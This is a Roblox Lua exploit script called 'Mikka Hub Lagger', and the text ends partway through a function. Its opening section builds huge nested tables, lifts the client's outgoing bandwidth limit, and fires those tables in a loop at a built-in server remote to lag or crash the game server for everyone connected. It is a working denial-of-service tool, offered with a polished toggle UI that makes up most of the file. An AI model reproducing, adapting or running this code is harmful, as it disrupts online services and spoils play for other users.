local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== LAGGER LOGIC ====================
local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
        if not path or path == "" then return nil end
        local obj = game
        local cleaned = path:gsub("^game%.", "")
        for segment in cleaned:gmatch("[^%.]+") do
                if obj then
                        obj = obj[segment]
                else
                        return nil
                end
        end
        return obj
end

local function getmaxvalue(val)
        local mainvalueifonetable = 499999
        if type(val) ~= "number" then return nil end
        return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        table.insert(spammedtable, {})
        local z = spammedtable[1]
        for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
        end
        local maximum = getmaxvalue(tableincrease) or 9999999
        for i = 1, maximum do
                table.insert(maintable, spammedtable)
                if i % 5000 == 0 then task.wait() end
        end
        local remote = resolveRemote(CUSTOM_REMOTE_PATH)
        if remote then
                for i = 1, tries do
                        pcall(function()
                                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                                        remote:FireServer(maintable)
                                elseif remote:IsA("RemoteFunction") then
                                        remote:InvokeServer(maintable)
                                end
                        end)
                end
        end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
        while laggerEnabled do
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                task.spawn(function()
                        bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
                end)
                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
        end
end

local function stopLaggerLoop()
        laggerEnabled = false
        if laggerThread then
                coroutine.close(laggerThread)
                laggerThread = nil
        end
end

local function startLagger()
        if laggerThread then return end
        laggerEnabled = true
        laggerThread = coroutine.create(startLaggerLoop)
        coroutine.resume(laggerThread)
end

-- Workspace optimization
for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Texture") or v:IsA("Decal") then
                v:Destroy()
        elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
                v.Material = Enum.Material.SmoothPlastic
        end
end
-- ==================== END LAGGER LOGIC ====================

-- ==================== UI ====================
local toggleKey = Enum.KeyCode.V

-- Baby Pink Color Palette
local Colors = {
    Background = Color3.fromRGB(255, 245, 250),
    CardBg = Color3.fromRGB(255, 235, 245),
    CardBgHover = Color3.fromRGB(255, 225, 240),
    BabyPink = Color3.fromRGB(255, 182, 193),
    BabyPinkLight = Color3.fromRGB(255, 200, 215),
    BabyPinkDark = Color3.fromRGB(255, 150, 170),
    HotPink = Color3.fromRGB(255, 105, 180),
    DeepPink = Color3.fromRGB(255, 20, 147),
    White = Color3.fromRGB(255, 255, 255),
    TextDark = Color3.fromRGB(80, 50, 65),
    TextMuted = Color3.fromRGB(150, 110, 130),
    TextLight = Color3.fromRGB(200, 160, 180),
    ToggleOff = Color3.fromRGB(220, 200, 210),
    ToggleOn = Color3.fromRGB(255, 105, 180),
    Shadow = Color3.fromRGB(180, 140, 160),
    Glow = Color3.fromRGB(255, 182, 193)
}

-- Root
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MikkaHubLagger"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = game.CoreGui

-- ==================== MINIMIZED TAB ====================
local MinimizedTab = Instance.new("Frame")
MinimizedTab.Name = "MinimizedTab"
MinimizedTab.Size = UDim2.new(0, 60, 0, 60)
MinimizedTab.Position = UDim2.new(0, 20, 0, 20)
MinimizedTab.BackgroundColor3 = Colors.BabyPink
MinimizedTab.BorderSizePixel = 0
MinimizedTab.Visible = false
MinimizedTab.Active = true
MinimizedTab.Draggable = true
MinimizedTab.Parent = ScreenGui

local MinTabCorner = Instance.new("UICorner", MinimizedTab)
MinTabCorner.CornerRadius = UDim.new(1, 0)

local MinTabStroke = Instance.new("UIStroke", MinimizedTab)
MinTabStroke.Color = Colors.HotPink
MinTabStroke.Thickness = 3
MinTabStroke.Transparency = 0.4

local MinTabShadow = Instance.new("ImageLabel", MinimizedTab)
MinTabShadow.Name = "Shadow"
MinTabShadow.Size = UDim2.new(1, 20, 1, 20)
MinTabShadow.Position = UDim2.new(0, -10, 0, -10)
MinTabShadow.BackgroundTransparency = 1
MinTabShadow.Image = "rbxassetid://131604521938076"
MinTabShadow.ImageColor3 = Colors.Shadow
MinTabShadow.ImageTransparency = 0.4
MinTabShadow.ScaleType = Enum.ScaleType.Slice
MinTabShadow.SliceCenter = Rect.new(50, 50, 50, 50)
MinTabShadow.ZIndex = -1

local MinTabIcon = Instance.new("ImageLabel", MinimizedTab)
MinTabIcon.Name = "Icon"
MinTabIcon.Size = UDim2.new(0, 40, 0, 40)
MinTabIcon.Position = UDim2.new(0.5, -20, 0.5, -20)
MinTabIcon.BackgroundTransparency = 1
MinTabIcon.Image = "https://files.catbox.moe/etlu5v.png"
MinTabIcon.ScaleType = Enum.ScaleType.Crop

local MinTabIconCorner = Instance.new("UICorner", MinTabIcon)
MinTabIconCorner.CornerRadius = UDim.new(1, 0)

local MinTabHit = Instance.new("TextButton", MinimizedTab)
MinTabHit.Name = "Hit"
MinTabHit.Size = UDim2.new(1, 0, 1, 0)
MinTabHit.BackgroundTransparency = 1
MinTabHit.Text = ""

-- Slide Text (appears when hovering minimized tab)
local SlideText = Instance.new("TextLabel")
SlideText.Name = "SlideText"
SlideText.Size = UDim2.new(0, 140, 0, 30)
SlideText.Position = UDim2.new(0, 70, 0.5, -15)
SlideText.BackgroundColor3 = Colors.BabyPink
SlideText.BackgroundTransparency = 0.1
SlideText.Text = "Mikka Hub Lagger"
SlideText.TextColor3 = Colors.TextDark
SlideText.TextSize = 13
SlideText.Font = Enum.Font.GothamBold
SlideText.TextXAlignment = Enum.TextXAlignment.Center
SlideText.Visible = false
SlideText.Parent = MinimizedTab

local SlideTextCorner = Instance.new("UICorner", SlideText)
SlideTextCorner.CornerRadius = UDim.new(0, 8)

local SlideTextStroke = Instance.new("UIStroke", SlideText)
SlideTextStroke.Color = Colors.HotPink
SlideTextStroke.Thickness = 1.5
SlideTextStroke.Transparency = 0.3

-- ==================== MAIN GUI ====================
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 340, 0, 420)
Main.Position = UDim2.new(0, 20, 0, 20)
Main.BackgroundColor3 = Colors.Background
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 24)

-- Main Shadow
local MainShadow = Instance.new("ImageLabel", Main)
MainShadow.Name = "Shadow"
MainShadow.Size = UDim2.new(1, 50, 1, 50)
MainShadow.Position = UDim2.new(0, -25, 0, -25)
MainShadow.BackgroundTransparency = 1
MainShadow.Image = "rbxassetid://131604521938076"
MainShadow.ImageColor3 = Colors.Shadow
MainShadow.ImageTransparency = 0.25
MainShadow.ScaleType = Enum.ScaleType.Slice
MainShadow.SliceCenter = Rect.new(50, 50, 50, 50)
MainShadow.ZIndex = -1

-- Outer Glow Ring
local GlowRing = Instance.new("Frame", Main)
GlowRing.Name = "GlowRing"
GlowRing.Size = UDim2.new(1, 30, 1, 30)
GlowRing.Position = UDim2.new(0, -15, 0, -15)
GlowRing.BackgroundColor3 = Colors.Glow
GlowRing.BackgroundTransparency = 0.92
GlowRing.BorderSizePixel = 0
GlowRing.ZIndex = -2

local GlowRingCorner = Instance.new("UICorner", GlowRing)
GlowRingCorner.CornerRadius = UDim.new(0, 30)

-- Top Gradient Bar
local TopBar = Instance.new("Frame", Main)
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 90)
TopBar.Position = UDim2.new(0, 0, 0, 0)
TopBar.BackgroundColor3 = Colors.BabyPink
TopBar.BorderSizePixel = 0

local TopBarCorner = Instance.new("UICorner", TopBar)
TopBarCorner.CornerRadius = UDim.new(0, 24)

-- Gradient overlay on top bar
local TopBarGradient = Instance.new("UIGradient", TopBar)
TopBarGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Colors.BabyPink),
    ColorSequenceKeypoint.new(1, Colors.BabyPinkLight)
})
TopBarGradient.Rotation = 45

-- Bottom extension for rounded look
local TopBarBottom = Instance.new("Frame", TopBar)
TopBarBottom.Size = UDim2.new(1, 0, 0, 30)
TopBarBottom.Position = UDim2.new(0, 0, 1, -15)
TopBarBottom.BackgroundColor3 = Colors.BabyPink
TopBarBottom.BorderSizePixel = 0
TopBarBottom.ZIndex = 0

-- Logo (Circular with ring)
local LogoContainer = Instance.new("Frame", TopBar)
LogoContainer.Name = "LogoContainer"
LogoContainer.Size = UDim2.new(0, 56, 0, 56)
LogoContainer.Position = UDim2.new(0, 20, 0, 17)
LogoContainer.BackgroundColor3 = Colors.White
LogoContainer.BorderSizePixel = 0

local LogoContainerCorner = Instance.new("UICorner", LogoContainer)
LogoContainerCorner.CornerRadius = UDim.new(1, 0)

local LogoRing = Instance.new("UIStroke", LogoContainer)
LogoRing.Color = Colors.HotPink
LogoRing.Thickness = 3
LogoRing.Transparency = 0.2

local Logo = Instance.new("ImageLabel", LogoContainer)
Logo.Name = "Logo"
Logo.Size = UDim2.new(0, 48, 0, 48)
Logo.Position = UDim2.new(0.5, -24, 0.5, -24)
Logo.BackgroundTransparency = 1
Logo.Image = "https://files.catbox.moe/etlu5v.png"
Logo.ScaleType = Enum.ScaleType.Crop

local LogoCorner = Instance.new("UICorner", Logo)
LogoCorner.CornerRadius = UDim.new(1, 0)

-- Title Group
local TitleGroup = Instance.new("Frame", TopBar)
TitleGroup.Name = "TitleGroup"
TitleGroup.Size = UDim2.new(1, -100, 0, 60)
TitleGroup.Position = UDim2.new(0, 88, 0, 15)
TitleGroup.BackgroundTransparency = 1

-- Title: "MIKKA HUB"
local Title = Instance.new("TextLabel", TitleGroup)
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "MIKKA HUB"
Title.TextColor3 = Colors.TextDark
Title.TextSize = 22
Title.Font = Enum.Font.GothamBlack
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Subtitle: "Lagger"
local Subtitle = Instance.new("TextLabel", TitleGroup)
Subtitle.Name = "Subtitle"
Subtitle.Size = UDim2.new(1, 0, 0, 20)
Subtitle.Position = UDim2.new(0, 0, 0, 30)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Lagger"
Subtitle.TextColor3 = Colors.HotPink
Subtitle.TextSize = 14
Subtitle.Font = Enum.Font.GothamMedium
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

-- Close Button (X)
local CloseBtn = Instance.new("TextButton", TopBar)
CloseBtn.Name = "CloseBtn"
CloseBtn.Size = UDim2.new(0, 36, 0, 36)
CloseBtn.Position = UDim2.new(1, -46, 0, 12)
CloseBtn.BackgroundColor3 = Colors.CardBg
CloseBtn.BorderSizePixel = 0
CloseBtn.Text = "×"
CloseBtn.TextColor3 = Colors.TextDark
CloseBtn.TextSize = 24
CloseBtn.Font = Enum.Font.GothamBlack
CloseBtn.AutoButtonColor = false

local CloseBtnCorner = Instance.new("UICorner", CloseBtn)
CloseBtnCorner.CornerRadius = UDim.new(1, 0)

local CloseBtnStroke = Instance.new("UIStroke", CloseBtn)
CloseBtnStroke.Color = Colors.BabyPinkDark
CloseBtnStroke.Thickness = 1.5
CloseBtnStroke.Transparency = 0.5

-- Minimize Button (-)
local MinBtn = Instance.new("TextButton", TopBar)
MinBtn.Name = "MinBtn"
MinBtn.Size = UDim2.new(0, 36, 0, 36)
MinBtn.Position = UDim2.new(1, -88, 0, 12)
MinBtn.BackgroundColor3 = Colors.CardBg
MinBtn.BorderSizePixel = 0
MinBtn.Text = "−"
MinBtn.TextColor3 = Colors.TextDark
MinBtn.TextSize = 22
MinBtn.Font = Enum.Font.GothamBlack
MinBtn.AutoButtonColor = false

local MinBtnCorner = Instance.new("UICorner", MinBtn)
MinBtnCorner.CornerRadius = UDim.new(1, 0)

local MinBtnStroke = Instance.new("UIStroke", MinBtn)
MinBtnStroke.Color = Colors.BabyPinkDark
MinBtnStroke.Thickness = 1.5
MinBtnStroke.Transparency = 0.5

-- Content Area
local Content = Instance.new("Frame", Main)
Content.Name = "Content"
Content.Size = UDim2.new(1, 0, 1, -100)
Content.Position = UDim2.new(0, 0, 0, 90)
Content.BackgroundTransparency = 1

-- Status Panel (Large Card)
local StatusPanel = Instance.new("Frame", Content)
StatusPanel.Name = "StatusPanel"
StatusPanel.Size = UDim2.new(1, -32, 0, 110)
StatusPanel.Position = UDim2.new(0, 16, 0, 16)
StatusPanel.BackgroundColor3 = Colors.CardBg
StatusPanel.BorderSizePixel = 0

local StatusPanelCorner = Instance.new("UICorner", StatusPanel)
StatusPanelCorner.CornerRadius = UDim.new(0, 18)

local StatusPanelStroke = Instance.new("UIStroke", StatusPanel)
StatusPanelStroke.Color = Colors.BabyPink
StatusPanelStroke.Thickness = 2
StatusPanelStroke.Transparency = 0.6

-- Status Icon (Circle)
local StatusIcon = Instance.new("Frame", StatusPanel)
StatusIcon.Name = "StatusIcon"
StatusIcon.Size = UDim2.new(0, 50, 0, 50)
StatusIcon.Position = UDim2.new(0, 20, 0.5, -25)
StatusIcon.BackgroundColor3 = Colors.ToggleOff
StatusIcon.BorderSizePixel = 0

local StatusIconCorner = Instance.new("UICorner", StatusIcon)
StatusIconCorner.CornerRadius = UDim.new(1, 0)

local StatusIconStroke = Instance.new("UIStroke", StatusIcon)
StatusIconStroke.Color = Colors.BabyPinkDark
StatusIconStroke.Thickness = 2
StatusIconStroke.Transparency = 0.4

-- Status Icon Inner
local StatusIconInner = Instance.new("Frame", StatusIcon)
StatusIconInner.Size = UDim2.new(0, 24, 0, 24)
StatusIconInner.Position = UDim2.new(0.5, -12, 0.5, -12)
StatusIconInner.BackgroundColor3 = Colors.TextLight
StatusIconInner.BorderSizePixel = 0

local StatusIconInnerCorner = Instance.new("UICorner", StatusIconInner)
StatusIconInnerCorner.CornerRadius = UDim.new(1, 0)

-- Status Text Group
local StatusTextGroup = Instance.new("Frame", StatusPanel)
StatusTextGroup.Size = UDim2.new(1, -100, 1, 0)
StatusTextGroup.Position = UDim2.new(0, 85, 0, 0)
StatusTextGroup.BackgroundTransparency = 1

local StatusLabel = Instance.new("TextLabel", StatusTextGroup)
StatusLabel.Name = "StatusLabel"
StatusLabel.Size = UDim2.new(1, 0, 0, 28)
StatusLabel.Position = UDim2.new(0, 0, 0, 22)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "INACTIVE"
StatusLabel.TextColor3 = Colors.TextMuted
StatusLabel.TextSize = 18
StatusLabel.Font = Enum.Font.GothamBlack
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left

local StatusDesc = Instance.new("TextLabel", StatusTextGroup)
StatusDesc.Name = "StatusDesc"
StatusDesc.Size = UDim2.new(1, 0, 0, 18)
StatusDesc.Position = UDim2.new(0, 0, 0, 52)
StatusDesc.BackgroundTransparency = 1
StatusDesc.Text = "Ready to lag"
StatusDesc.TextColor3 = Colors.TextLight
StatusDesc.TextSize = 12
StatusDesc.Font = Enum.Font.Gotham
StatusDesc.TextXAlignment = Enum.TextXAlignment.Left

-- Toggle Section
local ToggleSection = Instance.new("Frame", Content)
ToggleSection.Name = "ToggleSection"
ToggleSection.Size = UDim2.new(1, -32, 0, 70)
ToggleSection.Position = UDim2.new(0, 16, 0, 142)
ToggleSection.BackgroundColor3 = Colors.CardBg
ToggleSection.BorderSizePixel = 0

local ToggleSectionCorner = Instance.new("UICorner", ToggleSection)
ToggleSectionCorner.CornerRadius = UDim.new(0, 18)

local ToggleSectionStroke = Instance.new("UIStroke", ToggleSection)
ToggleSectionStroke.Color = Colors.BabyPink
ToggleSectionStroke.Thickness = 2
ToggleSectionStroke.Transparency = 0.6

local ToggleLabel = Instance.new("TextLabel", ToggleSection)
ToggleLabel.Size = UDim2.new(0.5, 0, 1, 0)
ToggleLabel.Position = UDim2.new(0, 20, 0, 0)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Text = "Enable Lagger"
ToggleLabel.TextColor3 = Colors.TextDark
ToggleLabel.TextSize = 15
ToggleLabel.Font = Enum.Font.GothamBold
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Toggle Switch
local ToggleSwitch = Instance.new("Frame", ToggleSection)
ToggleSwitch.Name = "ToggleSwitch"
ToggleSwitch.Size = UDim2.new(0, 56, 0, 30)
ToggleSwitch.Position = UDim2.new(1, -76, 0.5, -15)
ToggleSwitch.BackgroundColor3 = Colors.ToggleOff
ToggleSwitch.BorderSizePixel = 0

local ToggleSwitchCorner = Instance.new("UICorner", ToggleSwitch)
ToggleSwitchCorner.CornerRadius = UDim.new(1, 0)

local ToggleKnob = Instance.new("Frame", ToggleSwitch)
ToggleKnob.Name = "ToggleKnob"
ToggleKnob.Size = UDim2.new(0, 24, 0, 24)
ToggleKnob.Position = UDim2.new(0, 3, 0.5, -12)
ToggleKnob.BackgroundColor3 = Colors.White
ToggleKnob.BorderSizePixel = 0

local ToggleKnobCorner = Instance.new("UICorner", ToggleKnob)
ToggleKnobCorner.CornerRadius = UDim.new(1, 0)

local ToggleKnobShadow = Instance.new("UIStroke", ToggleKnob)
ToggleKnobShadow.Color = Colors.Shadow
ToggleKnobShadow.Thickness = 1
ToggleKnobShadow.Transparency = 0.3

local ToggleHit = Instance.new("TextButton", ToggleSwitch)
ToggleHit.Name = "ToggleHit"
ToggleHit.Size = UDim2.new(1, 0, 1, 0)
ToggleHit.BackgroundTransparency = 1
ToggleHit.Text = ""

-- Keybind Section
local KeybindSection = Instance.new("Frame", Content)
KeybindSection.Name = "KeybindSection"
KeybindSection.Size = UDim2.new(1, -32, 0, 70)
KeybindSection.Position = UDim2.new(0, 16, 0, 224)
KeybindSection.BackgroundColor3 = Colors.CardBg
KeybindSection.BorderSizePixel = 0

local KeybindCorner = Instance.new("UICorner", KeybindSection)
KeybindCorner.CornerRadius = UDim.new(0, 18)

local KeybindStroke = Instance.new("UIStroke", KeybindSection)
KeybindStroke.Color = Colors.BabyPink
KeybindStroke.Thickness = 2
KeybindStroke.Transparency = 0.6

local KeybindLabel = Instance.new("TextLabel", KeybindSection)
KeybindLabel.Size = UDim2.new(0.5, 0, 1, 0)
KeybindLabel.Position = UDim2.new(0, 20, 0, 0)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.Text = "Toggle Keybind"
KeybindLabel.TextColor3 = Colors.TextDark
KeybindLabel.TextSize = 15
KeybindLabel.Font = Enum.Font.GothamBold
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left

local KeybindBadge = Instance.new("Frame", KeybindSection)
KeybindBadge.Size = UDim2.new(0, 50, 0, 32)
KeybindBadge.Position = UDim2.new(1, -70, 0.5, -16)
KeybindBadge.BackgroundColor3 = Colors.BabyPink
KeybindBadge.BorderSizePixel = 0

local KeybindBadgeCorner = Instance.new("UICorner", KeybindBadge)
KeybindBadgeCorner.CornerRadius = UDim.new(0, 10)

local KeybindBadgeStroke = Instance.new("UIStroke", KeybindBadge)
KeybindBadgeStroke.Color = Colors.HotPink
KeybindBadgeStroke.Thickness = 2
KeybindBadgeStroke.Transparency = 0.3

local KeybindValue = Instance.new("TextLabel", KeybindBadge)
KeybindValue.Size = UDim2.new(1, 0, 1, 0)
KeybindValue.BackgroundTransparency = 1
KeybindValue.Text = "V"
KeybindValue.TextColor3 = Colors.TextDark
KeybindValue.TextSize = 16
KeybindValue.Font = Enum.Font.GothamBlack
KeybindValue.TextXAlignment = Enum.TextXAlignment.Center

-- Footer Info
local Footer = Instance.new("Frame", Content)
Footer.Name = "Footer"
Footer.Size = UDim2.new(1, -32, 0, 40)
Footer.Position = UDim2.new(0, 16, 1, -56)
Footer.BackgroundTransparency = 1

local FooterLine = Instance.new("Frame", Footer)
FooterLine.Size = UDim2.new(1, 0, 0, 1)
FooterLine.Position = UDim2.new(0, 0, 0, 0)
FooterLine.BackgroundColor3 = Colors.BabyPink
FooterLine.BackgroundTransparency = 0.7
FooterLine.BorderSizePixel = 0

local FooterText = Instance.new("TextLabel", Footer)
FooterText.Size = UDim2.new(1, 0, 0, 30)
FooterText.Position = UDim2.new(0, 0, 0, 8)
FooterText.BackgroundTransparency = 1
FooterText.Text = "Press [V] to toggle  |  v1.4"
FooterText.TextColor3 = Colors.TextLight
FooterText.TextSize = 11
FooterText.Font = Enum.Font.Gotham
FooterText.TextXAlignment = Enum.TextXAlignment.Center

-- ==================== ANIMATIONS ====================

-- Intro: Scale from center
Main.Size = UDim2.new(0, 0, 0, 0)
Main.Position = UDim2.new(0, 20 + 170, 0, 20 + 210)
Main.BackgroundTransparency = 1
Main.Visible = true

TweenService:Create(Main, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 340, 0, 420),
    Position = UDim2.new(0, 20, 0, 20),
    BackgroundTransparency = 0
}):Play()

-- Staggered fade-in for all children
local function fadeInChildren(parent, delayOffset)
    for _, child in pairs(parent:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") or child:IsA("Frame") then
            if child ~= Main and child ~= GlowRing and child ~= MainShadow and child ~= TopBarBottom then
                local origBg = child.BackgroundTransparency
                local origText = child:IsA("TextLabel") and child.TextTransparency or 0
                local origImage = child:IsA("ImageLabel") and child.ImageTransparency or 0

                child.BackgroundTransparency = 1
                if child:IsA("TextLabel") or child:IsA("TextButton") then
                    child.TextTransparency = 1
                end
                if child:IsA("ImageLabel") then
                    child.ImageTransparency = 1
                end

                task.delay(delayOffset + (math.random() * 0.5), function()
                    TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                        BackgroundTransparency = origBg
                    }):Play()
                    if child:IsA("TextLabel") or child:IsA("TextButton") then
                        TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                            TextTransparency = origText
                        }):Play()
                    end
                    if child:IsA("ImageLabel") then
                        TweenService:Create(child, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
                            ImageTransparency = origImage
                        }):Play()
                    end
                end)
            end
        end
    end
end

fadeInChildren(Main, 0.3)

-- Hover effects for cards
local function addHoverEffect(frame, stroke)
    frame.MouseEnter:Connect(function()
        TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Colors.CardBgHover
        }):Play()
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
                Color = Colors.HotPink,
                Transparency = 0.3
            }):Play()
        end
    end)
    frame.MouseLeave:Connect(function()
        TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Colors.CardBg
        }):Play()
        if stroke then
            TweenService:Create(stroke, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
                Color = Colors.BabyPink,
                Transparency = 0.6
            }):Play()
        end
    end)
end

addHoverEffect(StatusPanel, StatusPanelStroke)
addHoverEffect(ToggleSection, ToggleSectionStroke)
addHoverEffect(KeybindSection, KeybindStroke)

-- Logo hover: scale + ring pulse
LogoContainer.MouseEnter:Connect(function()
    TweenService:Create(LogoContainer, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 62, 0, 62),
        Position = UDim2.new(0, 17, 0, 14)
    }):Play()
    TweenService:Create(LogoRing, TweenInfo.new(0.3), {
        Transparency = 0,
        Thickness = 4
    }):Play()
end)

LogoContainer.MouseLeave:Connect(function()
    TweenService:Create(LogoContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0, 56, 0, 56),
        Position = UDim2.new(0, 20, 0, 17)
    }):Play()
    TweenService:Create(LogoRing, TweenInfo.new(0.3), {
        Transparency = 0.2,
        Thickness = 3
    }):Play()
end)

-- Close button hover
CloseBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(255, 100, 100),
        TextColor3 = Colors.White
    }):Play()
    TweenService:Create(CloseBtnStroke, TweenInfo.new(0.2), {
        Color = Color3.fromRGB(255, 80, 80),
        Transparency = 0
    }):Play()
end)

CloseBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Colors.CardBg,
        TextColor3 = Colors.TextDark
    }):Play()
    TweenService:Create(CloseBtnStroke, TweenInfo.new(0.2), {
        Color = Colors.BabyPinkDark,
        Transparency = 0.5
    }):Play()
end)

-- Minimize button hover
MinBtn.MouseEnter:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Colors.BabyPinkLight,
        TextColor3 = Colors.HotPink
    }):Play()
    TweenService:Create(MinBtnStroke, TweenInfo.new(0.2), {
        Color = Colors.HotPink,
        Transparency = 0.2
    }):Play()
end)

MinBtn.MouseLeave:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Colors.CardBg,
        TextColor3 = Colors.TextDark
    }):Play()
    TweenService:Create(MinBtnStroke, TweenInfo.new(0.2), {
        Color = Colors.BabyPinkDark,
        Transparency = 0.5
    }):Play()
end)

-- Minimized Tab hover: show slide text
MinimizedTab.MouseEnter:Connect(function()
    SlideText.Visible = true
    SlideText.Position = UDim2.new(0, 50, 0.5, -15)
    SlideText.BackgroundTransparency = 1
    SlideText.TextTransparency = 1

    TweenService:Create(SlideText, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0, 70, 0.5, -15),
        BackgroundTransparency = 0.1,
        TextTransparency = 0
    }):Play()

    TweenService:Create(MinTabStroke, TweenInfo.new(0.3), {
        Transparency = 0.1,
        Thickness = 4
    }):Play()
end)

MinimizedTab.MouseLeave:Connect(function()
    TweenService:Create(SlideText, TweenInfo.new(0.2), {
        Position = UDim2.new(0, 50, 0.5, -15),
        BackgroundTransparency = 1,
        TextTransparency = 1
    }):Play()
    task.wait(0.2)
    SlideText.Visible = false

    TweenService:Create(MinTabStroke, TweenInfo.new(0.3), {
        Transparency = 0.4,
        Thickness = 3
    }):Play()
end)

-- Minimized Tab hover: icon pulse
MinimizedTab.MouseEnter:Connect(function()
    TweenService:Create(MinTabIcon, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 44, 0, 44),
        Position = UDim2.new(0.5, -22, 0.5, -22)
    }):Play()
end)

MinimizedTab.MouseLeave:Connect(function()
    TweenService:Create(MinTabIcon, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0, 40, 0, 40),
        Position = UDim2.new(0.5, -20, 0.5, -20)
    }):Play()
end)

-- ==================== OPEN / CLOSE / MINIMIZE ====================

local isOpen = true
local isMinimized = false

local function closeGUI()
    isOpen = false
    -- Shrink and fade out
    TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0, Main.Position.X.Offset + 170, 0, Main.Position.Y.Offset + 210),
        BackgroundTransparency = 1
    }):Play()

    for _, child in pairs(Main:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") then
            TweenService:Create(child, TweenInfo.new(0.2), {TextTransparency = 1}):Play()
        end
        if child:IsA("ImageLabel") then
            TweenService:Create(child, TweenInfo.new(0.2), {ImageTransparency = 1}):Play()
        end
        if child:IsA("Frame") and child ~= Main and child ~= GlowRing and child ~= MainShadow then
            TweenService:Create(child, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        end
    end

    task.wait(0.4)
    Main.Visible = false

    -- Show minimized tab
    MinimizedTab.Visible = true
    MinimizedTab.Size = UDim2.new(0, 0, 0, 0)
    MinimizedTab.Position = UDim2.new(0, Main.Position.X.Offset + 30, 0, Main.Position.Y.Offset + 30)

    TweenService:Create(MinimizedTab, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 60, 0, 60),
        Position = UDim2.new(0, Main.Position.X.Offset, 0, Main.Position.Y.Offset)
    }):Play()
end

local function openGUI()
    isOpen = true
    Main.Visible = true

    -- Hide minimized tab
    TweenService:Create(MinimizedTab, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0, MinimizedTab.Position.X.Offset + 30, 0, MinimizedTab.Position.Y.Offset + 30)
    }):Play()

    task.wait(0.3)
    MinimizedTab.Visible = false

    -- Pop in main
    Main.Size = UDim2.new(0, 0, 0, 0)
    Main.Position = UDim2.new(0, Main.Position.X.Offset + 170, 0, Main.Position.Y.Offset + 210)
    Main.BackgroundTransparency = 1

    TweenService:Create(Main, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 340, 0, 420),
        Position = UDim2.new(0, Main.Position.X.Offset - 170, 0, Main.Position.Y.Offset - 210),
